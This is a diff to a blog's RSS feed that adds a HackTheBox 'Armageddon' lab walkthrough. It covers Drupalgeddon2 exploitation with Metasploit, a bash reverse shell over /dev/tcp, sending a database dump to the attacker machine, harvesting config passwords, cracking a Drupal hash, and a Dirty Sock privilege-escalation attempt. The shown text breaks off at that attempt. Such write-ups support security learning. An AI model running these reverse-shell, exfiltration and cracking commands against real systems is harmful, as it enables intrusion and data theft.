@@ -5,7 +5,373 @@
     <link>https://fahmifj.github.io/categories/writeup/</link>
     <description>Recent content in Writeup on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Thu, 15 Jul 2021 13:17:29 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 26 Jul 2021 11:21:43 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Armageddon</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-armageddon/</link>
+      <pubDate>Mon, 26 Jul 2021 11:21:43 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-armageddon/</guid>
+      <description>Armageddon is an easy Linux machine from HackTheBox that features an instance of Drupal 7 CMS. Enumeration of the CMS reveals that it is vulnerable to a remote code execution. With help of Metasploit module, I&amp;rsquo;m able to compromise the web server. Examining the Drupal configuration files discovers a set of database credentials, which can be used to dump the user password from the database and crack it. The user is allowed to install a snap package as root user, and this could be leveraged to obtain root shell.</description>
+      <content:encoded><![CDATA[<p>Armageddon is an easy Linux machine from HackTheBox that features an instance of Drupal 7 CMS. Enumeration of the CMS reveals that it is vulnerable to a remote code execution. With help of Metasploit module, I&rsquo;m able to compromise the web server. Examining the Drupal configuration files discovers a set of database credentials, which can be used to dump the user password from the database and crack it. The user is allowed to install a snap package as root user, and this could be leveraged to obtain root shell.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Exploitation of Drupalgeddon</li>
+<li>Exploitation of Dirty Sock</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Nmap</li>
+<li>Metasploit</li>
+<li><a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py">Dirty_sockv2.py</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>An initial <code>nmap</code> scan discovers two open ports: SSH on 22 and an Apache Web Server serving Drupal 7 on 80.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «armageddon» «10.10.14.4» 
+$ nmap -sC -sV -oA scans/10-initial-armageddon 10.129.90.96
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-03-29 22:27 EDT
+Nmap scan report <span class="k">for</span> 10.129.90.96
+Host is up <span class="o">(</span>0.30s latency<span class="o">)</span>.
+Not shown: <span class="m">998</span> closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">2048</span> 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
+<span class="p">|</span>_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
+<span class="p">|</span>_http-generator: Drupal <span class="m">7</span> <span class="o">(</span>http://drupal.org<span class="o">)</span>
+<span class="p">|</span> http-methods: 
+<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+<span class="p">|</span> http-robots.txt: <span class="m">36</span> disallowed entries <span class="o">(</span><span class="m">15</span> shown<span class="o">)</span>
+<span class="p">|</span> /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+<span class="p">|</span> /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+<span class="p">|</span> /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+<span class="p">|</span>_/LICENSE.txt /MAINTAINERS.txt
+<span class="p">|</span>_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
+<span class="p">|</span>_http-title: Welcome to  Armageddon <span class="p">|</span>  Armageddon
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span class="c1"># Nmap done at Mon Mar 29 22:28:01 2021 -- 1 IP address (1 host up) scanned in 51.04 seconds</span>
+</code></pre></div><p>Nmap also identified the OS used to be CentOs, so there is a chance that it would only allow outgoing connection to ports below 1024.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80----website">TCP 80 -  Website</h3>
+<p>Visiting port 80 presented with a page that has no other content except a login form.</p>
+<p><img class="img-container" src="imgs/image-20210330094613154.png" alt="image-20210330094613154"  />
+</p>
+<p>Previous <code>nmap</code> scan detected that there is a changelog file. Poking <code>/CHANGELOG.txt</code> discovered the exact version of this Drupal instance.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «armageddon» «10.10.14.4» 
+$ curl -s http://10.129.90.96/CHANGELOG.txt 
+Drupal 7.56, 2017-06-21
+-----------------------
+- Fixed security issues <span class="o">(</span>access bypass<span class="o">)</span>. See SA-CORE-2017-003.
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>With the version has been determined, I could throw this to <code>searchsploit</code>.</p>
+<h4 id="finding-vulnerabilities">Finding Vulnerabilities</h4>
+<p><code>searchsploit</code>  pops a lot of exploit results related to Drupal 7. But, based on the results, it is clear that the current version of Drupal seems to be vulnerable to remote code execution.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «armageddon» «10.10.14.4» 
+$ searchsploit Drupal <span class="m">7</span>
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     <span class="p">|</span>  Path
+----------------------------------------------------------------------------------- ---------------------------------
+Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>Add Admin User<span class="o">)</span>                  <span class="p">|</span> php/webapps/34992.py
+Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>Admin Session<span class="o">)</span>                   <span class="p">|</span> php/webapps/44355.php
+Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>PoC<span class="o">)</span> <span class="o">(</span>Reset Password<span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>        <span class="p">|</span> php/webapps/34984.py
+Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>PoC<span class="o">)</span> <span class="o">(</span>Reset Password<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>        <span class="p">|</span> php/webapps/34993.php
+Drupal 7.0 &lt; 7.31 - <span class="s1">&#39;Drupalgeddon&#39;</span> SQL Injection <span class="o">(</span>Remote Code Execution<span class="o">)</span>           <span class="p">|</span> php/webapps/35150.php
+Drupal 7.12 - Multiple Vulnerabilities                                             <span class="p">|</span> php/webapps/18564.txt
+Drupal 7.x Module Services - Remote Code Execution                                 <span class="p">|</span> php/webapps/41564.php
+Drupal &lt; 4.7.6 - Post Comments Remote Command Execution                            <span class="p">|</span> php/webapps/3313.pl
+Drupal &lt; 7.34 - Denial of Service                                                  <span class="p">|</span> php/dos/35415.txt
+Drupal &lt; 7.34 - Denial of Service                                                  <span class="p">|</span> php/dos/35415.txt
+Drupal &lt; 7.58 - <span class="s1">&#39;Drupalgeddon3&#39;</span> <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code <span class="o">(</span>Metasploit<span class="o">)</span>           <span class="p">|</span> php/webapps/44557.rb
+Drupal &lt; 7.58 - <span class="s1">&#39;Drupalgeddon3&#39;</span> <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code Execution <span class="o">(</span>PoC<span class="o">)</span>        <span class="p">|</span> php/webapps/44542.txt
+Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">&#39;Drupalgeddon2&#39;</span> Remote Code Executio <span class="p">|</span> php/webapps/44449.rb
+Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">&#39;Drupalgeddon2&#39;</span> Remote Code Executio <span class="p">|</span> php/webapps/44449.rb
+Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">&#39;Drupalgeddon2&#39;</span> Remote Code Execution <span class="o">(</span>Metasp <span class="p">|</span> php/remote/44482.rb
+Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">&#39;Drupalgeddon2&#39;</span> Remote Code Execution <span class="o">(</span>PoC<span class="o">)</span>   <span class="p">|</span> php/webapps/44448.py
+Drupal &lt; 8.5.11 / &lt; 8.6.10 - RESTful Web Services unserialize<span class="o">()</span> Remote Command Exe <span class="p">|</span> php/remote/46510.rb
+Drupal &lt; 8.6.10 / &lt; 8.5.11 - REST Module Remote Code Execution                     <span class="p">|</span> php/webapps/46452.txt
+Drupal &lt; 8.6.9 - REST Module Remote Code Execution                                 <span class="p">|</span> php/webapps/46459.py
+Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                  <span class="p">|</span> php/webapps/44501.txt
+Drupal Module CKEditor &lt; 4.1WYSIWYG <span class="o">(</span>Drupal 6.x/7.x<span class="o">)</span> - Persistent Cross-Site Scrip <span class="p">|</span> php/webapps/25493.txt
+Drupal Module Coder &lt; 7.x-1.3/7.x-2.6 - Remote Code Execution                      <span class="p">|</span> php/remote/40144.php
+Drupal Module Cumulus 5.x-1.1/6.x-1.4 - <span class="s1">&#39;tagcloud&#39;</span> Cross-Site Scripting            <span class="p">|</span> php/webapps/35397.txt
+Drupal Module RESTWS 7.x - PHP Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                  <span class="p">|</span> php/remote/40130.rb
+----------------------------------------------------------------------------------- ---------------------------------
+</code></pre></div><p>Since &ldquo;Drupalgeddon2&rdquo; exploits doesn&rsquo;t state it required an authentication, I will give it a try.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-apache">Shell as apache</h3>
+<h4 id="metasploit---drupalgeddon-2">Metasploit - Drupalgeddon 2</h4>
+<p>Metasploit has a module for Drupalgeddon2 ( <code>exploit/unix/webapp/drupal_drupalgeddon2</code>). On my first attempt, it returned with no sessions.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.129.90.96
+<span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.129.90.96
+msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; <span class="nb">set</span> LHOST tun0
+<span class="nv">LHOST</span> <span class="o">=</span>&gt; tun0
+msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">9001</span>
+<span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">9001</span>
+msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; run
+
+<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.4:9001 
+<span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
+<span class="o">[</span>+<span class="o">]</span> The target is vulnerable.
+<span class="o">[</span>*<span class="o">]</span> Exploit completed, but no session was created
+</code></pre></div><p>By assuming that the firewall block all outgoing port except well-known, I changed my listen port to 443, and now it successfully opened a session.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; <span class="nb">set</span> lport <span class="m">443</span>
+<span class="nv">lport</span> <span class="o">=</span>&gt; <span class="m">443</span>
+msf6 exploit<span class="o">(</span>unix/webapp/drupal_drupalgeddon2<span class="o">)</span> &gt; run
+
+<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.4:443 
+<span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
+<span class="o">[</span>+<span class="o">]</span> The target is vulnerable.
+<span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">39282</span> bytes<span class="o">)</span> to 10.129.90.96
+<span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.10.14.4:443 -&gt; 10.129.90.96:44612<span class="o">)</span> at 2021-03-29 23:47:59 -0400
+
+meterpreter &gt; shell
+Process <span class="m">9611</span> created.
+Channel <span class="m">0</span> created.
+whoami
+apache
+<span class="nb">pwd</span>
+/var/www/html
+</code></pre></div><p>I sent the following command because I wanted to change my shell, so I can do the PTY trick.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.4/88 0&gt;&amp;1&#39;</span>
+</code></pre></div><p>On my listener</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ kali@kali «armageddon» «10.10.14.4» 
+$ nc -nvlp <span class="m">88</span>  
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">88</span> ...
+connect to <span class="o">[</span>10.10.14.4<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.90.96<span class="o">]</span> <span class="m">58422</span>
+bash: no job control in this shell
+bash-4.2$ 
+</code></pre></div><p>However, I&rsquo;m unable to get the PTY trick working. It always returns the following error.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bash-4.2$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+  File <span class="s2">&#34;&lt;string&gt;&#34;</span>, line 1, in &lt;module&gt;
+  File <span class="s2">&#34;/usr/lib64/python3.6/pty.py&#34;</span>, line 154, in spawn
+    pid, <span class="nv">master_fd</span> <span class="o">=</span> fork<span class="o">()</span>
+  File <span class="s2">&#34;/usr/lib64/python3.6/pty.py&#34;</span>, line 96, in fork
+    master_fd, <span class="nv">slave_fd</span> <span class="o">=</span> openpty<span class="o">()</span>
+  File <span class="s2">&#34;/usr/lib64/python3.6/pty.py&#34;</span>, line 29, in openpty
+    master_fd, <span class="nv">slave_name</span> <span class="o">=</span> _open_terminal<span class="o">()</span>
+  File <span class="s2">&#34;/usr/lib64/python3.6/pty.py&#34;</span>, line 59, in _open_terminal
+    raise OSError<span class="o">(</span><span class="s1">&#39;out of pty devices&#39;</span><span class="o">)</span>
+OSError: out of pty devices
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-brucetherealadmin">Shell as brucetherealadmin</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>There is only one user other than root who has a login shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.2$ cat /etc/passwd <span class="p">|</span> grep sh$
+root:x:0:0:root:/root:/bin/bash
+brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
+</code></pre></div><p>Running a recursive grep to find passwords under the web root directory pops one password out from <code>settings.php</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.2$ <span class="nb">pwd</span>
+/var/www/html
+bash-4.2$ grep -Ri <span class="s2">&#34;password&#34;</span> 2&gt;/dev/null
+... &lt;snip&gt; ...
+sites/default/settings.php:      <span class="s1">&#39;password&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;CQHEy@9M*m23gBVj&#39;</span>,
+... &lt;snip&gt; ...
+</code></pre></div><p>Looking at the contents of  <code>settings.php</code>, reveals a database credential.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-4.2$ cat sites/default/settings.php
+<span class="nv">$databases</span> <span class="o">=</span> array <span class="o">(</span>
+  <span class="s1">&#39;default&#39;</span> <span class="o">=</span>&gt; 
+  array <span class="o">(</span>
+    <span class="s1">&#39;default&#39;</span> <span class="o">=</span>&gt; 
+    array <span class="o">(</span>
+      <span class="s1">&#39;database&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;drupal&#39;</span>,
+      <span class="s1">&#39;username&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;drupaluser&#39;</span>,
+      <span class="s1">&#39;password&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;CQHEy@9M*m23gBVj&#39;</span>,
+      <span class="s1">&#39;host&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;localhost&#39;</span>,
+      <span class="s1">&#39;port&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
+      <span class="s1">&#39;driver&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;mysql&#39;</span>,
+      <span class="s1">&#39;prefix&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
+    <span class="o">)</span>,
+  <span class="o">)</span>,
+<span class="o">)</span><span class="p">;</span>
+</code></pre></div><h4 id="mysql-access">MySQL Access</h4>
+<p>The password didn&rsquo;t work for user <code>brucetherealadmin</code>, but it did work for the database (of course). Unfortunately, because I&rsquo;m not in a TTY, I couldn&rsquo;t get into MySQL interactive shell, so instead, I dump the database using <code>mysqldump</code> and exfil the output to my attacking machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bash-4.2$ mysqldump -u drupaluser -p<span class="s1">&#39;CQHEy@9M*m23gBVj&#39;</span> drupal &gt; drupal.dump<span class="p">;</span> cat drupal.dump &gt; /dev/tcp/10.10.14.4/88
+</code></pre></div><p>On my Kali.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ kali@kali «loot» «10.10.14.4» 
+$ nc -nvlp <span class="m">88</span> &gt; drupal.dump
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">88</span> ...
+connect to <span class="o">[</span>10.10.14.4<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.90.96<span class="o">]</span> <span class="m">58444</span>
+</code></pre></div><p>Examination of the dumped data reveals the structure of  <code>users</code> table.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span><span class="w">
+</span><span class="w"></span><span class="k">DROP</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="k">IF</span><span class="w"> </span><span class="k">EXISTS</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="p">;</span><span class="w">
+</span><span class="w"></span><span class="cm">/*!40101 SET @saved_cs_client     = @@character_set_client */</span><span class="p">;</span><span class="w">
+</span><span class="w"></span><span class="cm">/*!40101 SET character_set_client = utf8 */</span><span class="p">;</span><span class="w">
+</span><span class="w"></span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="w"> </span><span class="p">(</span><span class="w">
+</span><span class="w">  </span><span class="o">`</span><span class="n">uid</span><span class="o">`</span><span class="w"> </span><span class="kt">int</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="k">unsigned</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="no">NULL</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="w"> </span><span class="n">COMMENT</span><span class="w"> </span><span class="s1">&#39;Primary Key: Unique user ID.&#39;</span><span class="p">,</span><span class="w">
+</span><span class="w">  </span><span class="o">`</span><span class="n">name</span><span class="o">`</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="no">NULL</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="n">COMMENT</span><span class="w"> </span><span class="s1">&#39;Unique user name.&#39;</span><span class="p">,</span><span class="w">
+</span><span class="w">  </span><span class="o">`</span><span class="n">pass</span><span class="o">`</span><span class="w"> </span><span class="kt">varchar</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="no">NULL</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="n">COMMENT</span><span class="w"> </span><span class="s1">&#39;User’s password (hashed).&#39;</span><span class="p">,</span><span class="w">
+</span><span class="w"></span><span class="p">...[</span><span class="n">SNIP</span><span class="p">]...</span><span class="w">
+</span></code></pre></div><p>Knowing the <code>users</code> table structure, I could use the MySQL <code>-e</code> option to retrieve the contents of column <code>name</code> and column <code>pass</code>  from the <code>users</code> table. This returns a password hash of <code>brucetherealadmin</code>, and I will have to crack this.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bash-4.2$ mysql -h localhost -u drupaluser -p<span class="s1">&#39;CQHEy@9M*m23gBVj&#39;</span> drupal -e <span class="s1">&#39;select name, pass from users&#39;</span>
+name    pass
+brucetherealadmin       <span class="nv">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97</span>.oOsUf1xAhaadURt
+</code></pre></div><h4 id="password-crack">Password Crack</h4>
+<p>The password has been recovered back to plain text using <code>hashcat</code> and <code>rockyou.txt</code>.</p>
+<pre><code>C:\tools\hashcat6&gt; hashcat.exe -m 7900 &quot;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&quot; rockyou.txt
+...[SNIP]...
+$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Drupal7
+Hash.Target......: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
+Time.Started.....: Tue Mar 30 12:03:57 2021 (3 secs)
+Time.Estimated...: Tue Mar 30 12:04:00 2021 (0 secs)
+...[SNIP]...
+</code></pre><h4 id="ssh---brucetherealadmin">SSH - brucetherealadmin</h4>
+<p>The password <code>booboo</code> works for brucetherealadmin and can be used on SSH.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.4» 
+$ ssh brucetherealadmin@10.129.90.96
+brucetherealadmin@10.10.10.233<span class="err">&#39;</span>s password:
+Last login: Tue Mar <span class="m">23</span> 12:40:36 <span class="m">2021</span> from 10.10.14.2
+<span class="o">[</span>brucetherealadmin@armageddon ~<span class="o">]</span>$ id <span class="o">&amp;&amp;</span> hostname
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>brucetherealadmin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>brucetherealadmin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>brucetherealadmin<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+</code></pre></div><p>User flag is done here.</p>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="sudo-privilege---snap">Sudo privilege - snap</h4>
+<p>User <code>brucetherealadmin</code> is allowed to run  <code>/usr/bin/snap install</code> as root user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon ~<span class="o">]</span>$ sudo -l
+Matching Defaults entries <span class="k">for</span> brucetherealadmin on armageddon:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;MAIL
+</span><span class="s2">    PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_MONETARY LC_NAME LC_NUMERIC
+</span><span class="s2">    LC_PAPER LC_TELEPHONE&#34;</span>, <span class="nv">env_keep</span><span class="o">+=</span><span class="s2">&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span>, <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin
+
+User brucetherealadmin may run the following commands on armageddon:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/snap install *
+</code></pre></div><h4 id="dirty-sock">Dirty Sock</h4>
+<p>After googling around, I found <a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html">this blog</a> by <a href="https://twitter.com/init_string">Chris Moberly</a> about Dirty Sock vulnerability. There are two working exploits for this vulnerability:</p>
+<ul>
+<li>
+<p><a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv1.py">dirty_sockv1</a>: Uses the ‘create-user’ API to create a local user based on details queried from the Ubuntu SSO.</p>
+</li>
+<li>
+<p><a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py">dirty_sockv2</a>: Sideloads a snap that contains an install-hook that generates a new local user.</p>
+</li>
+</ul>
+<p>The current target machine is clearly doesn&rsquo;t have an SSO, so v2 will be used. The goal here is to install a malicious snap package which contains an install-hook script that creates a local user with administrative privilege.</p>
+<p>First, I will grab the exploit and transfer it to Armageddon</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploit» «10.10.14.4» 
+$ wget https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py
+→ kali@kali «exploit» «10.10.14.4» 
+$ scp dirty_sockv2.py brucetherealadmin@10.129.92.110:/dev/shm
+brucetherealadmin@10.129.92.110<span class="err">&#39;</span>s password: 
+dirty_sockv2.py                                       100% <span class="m">8696</span>     8.5KB/s   00:01    
+</code></pre></div><p>Back to Armageddon, I will add the execute permission and run the exploit. But, it returns an unauthorized message (status code: 401).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>brucetherealadmin@armageddon <span class="o">]</span>$ <span class="nb">cd</span> /dev/shm
+<span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ chmod +x dirty_sockv2.py
+<span class="o">[</span>brucetherealadmin@armageddon shm<span class="o">]</span>$ ./dirty_sockv2.py
+./dirty_sockv2.py
+
+      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
+      <span class="p">|</span>  <span class="se">\ </span><span class="p">|</span> <span class="p">|</span>__/  <span class="p">|</span>   <span class="se">\_</span>/      <span class="o">[</span>__  <span class="p">|</span>  <span class="p">|</span> <span class="p">|</span>    <span class="p">|</span>_/  
+      <span class="p">|</span>__/ <span class="p">|</span> <span class="p">|</span>  <span class="se">\ </span> <span class="p">|</span>    <span class="p">|</span>   ___ ___<span class="o">]</span> <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>___ <span class="p">|</span> <span class="se">\_</span> 
+                       <span class="o">(</span>version 2<span class="o">)</span>
+
+//<span class="o">=========[]==========================================</span><span class="se">\\</span>
+<span class="o">||</span> R<span class="p">&amp;</span>D     <span class="o">||</span> initstring <span class="o">(</span>@init_string<span class="o">)</span>                <span class="o">||</span>
+<span class="o">||</span> Source  <span class="o">||</span> https://github.com/initstring/dirty_sock <span class="o">||</span>
+<span class="o">||</span> Details <span class="o">||</span> https://initblog.com/2019/dirty-sock     <span class="o">||</span>
+<span class="se">\\</span><span class="o">=========[]==========================================</span>//
+
+
+<span class="o">[</span>+<span class="o">]</span> Slipped dirty sock on random socket file: /tmp/iwnwuewhvr<span class="p">;</span><span class="nv">uid</span><span class="o">=</span>0<span class="p">;</span>
+<span class="o">[</span>+<span class="o">]</span> Binding to socket file...
+<span class="o">[</span>+<span class="o">]</span> Connecting to snapd API...
+<span class="o">[</span>+<span class="o">]</span> Deleting trojan snap <span class="o">(</span>and sleeping <span class="m">5</span> seconds<span class="o">)</span>...
+<span class="o">[</span>!<span class="o">]</span> System may not be vulnerable, here is the API reply:
+
+
+HTTP/1.1 <span class="m">401</span> Unauthorized
+Content-Type: application/json
